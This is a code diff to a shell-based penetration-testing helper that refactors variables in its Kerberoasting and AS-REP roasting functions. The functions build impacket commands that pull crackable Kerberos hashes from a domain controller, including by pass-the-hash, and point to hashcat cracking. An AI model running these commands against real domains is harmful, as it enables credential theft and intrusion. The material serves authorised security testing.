@@ -46,7 +46,7 @@ nb-ad-kerb-kerberoast() {
     nb-vars-set-user
 
 	  __ask "Enter the IP address of the target DC server"
-    local dc && __askvar dc DC_IP
+    nb-vars-set-dchost
 
     __ask "Do you want to log in using a password or a hash? (p/h)"
     local login && __askvar login "LOGIN_OPTION"
@@ -55,12 +55,12 @@ nb-ad-kerb-kerberoast() {
         echo
         __ask "Enter a password for authentication"
         nb-vars-set-pass
-        print -z "impacket-GetUserSPNs -request ${__DOMAIN}/${__USER}:'${__PASS}' -dc-ip $dc -outputfile $(__netpath)/kerberoast.txt"
+        print -z "impacket-GetUserSPNs -request ${__DOMAIN}/${__USER}:'${__PASS}' -dc-ip ${__DCHOST} -outputfile $(__dcpath)/kerberoast.txt"
     elif [[ $login == "h" ]]; then
         echo
         __ask "Enter the NT:LM hash for authentication"
         __check-hash
-        print -z "sudo impacket-GetUserSPNs -hashes ${__HASH} ${__DOMAIN}/${__USER} -outputfile $(__netpath)/kerberoast.txt"
+        print -z "sudo impacket-GetUserSPNs -hashes ${__HASH} ${__DOMAIN}/${__USER} -outputfile $(__dcpath)/kerberoast.txt"
     else
         __err "Invalid option. Please choose 'p' for password or 'h' for hash."
     fi
@@ -77,12 +77,12 @@ nb-ad-kerb-asreproast() {
   fi
 
 	__ask "Enter the IP address of the target domain controller"
-	nb-vars-set-rhost
+	nb-vars-set-dchost
   nb-vars-set-domain
 	__ask "Enter a users wordlist"
   __askpath ul FILE $HOME/desktop/projects/
 
-	print -z "impacket-GetNPUsers -dc-ip ${__RHOST} ${__DOMAIN}/ -no-pass -usersfile $ul -format hashcat -outputfile $(__netpath)/asrep-hashes.txt"
+	print -z "impacket-GetNPUsers -dc-ip ${__DCHOST} ${__DOMAIN}/ -no-pass -usersfile $ul -format hashcat -outputfile $(__dcpath)/asrep-hashes.txt"
 
   __info "You can now crack this hash with mode '18200' using 'nb-crack-list'"
 }
